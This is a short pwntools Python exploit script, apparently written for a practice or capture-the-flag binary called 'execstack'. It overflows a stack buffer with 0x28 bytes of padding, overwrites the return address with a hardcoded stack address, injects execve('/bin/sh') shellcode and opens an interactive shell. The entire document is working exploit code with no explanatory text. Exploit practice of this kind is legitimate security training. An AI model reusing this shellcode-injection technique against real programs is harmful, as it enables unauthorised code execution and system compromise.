#!/usr/bin/python3
 
from pwn import *

vuln = ELF("./execstack")

p = process("./execstack")
context.binary = vuln

p.recvline()
pause()

payload = 0x28 *b"A" #padding
payload += p64(0x7fffffffd440) 
#payload += p64(0xdeadbeef)
payload += asm(shellcraft.execve("/bin/sh"))
p.sendline(payload)
open("payload.txt", "wb").write(payload)

p.interactive()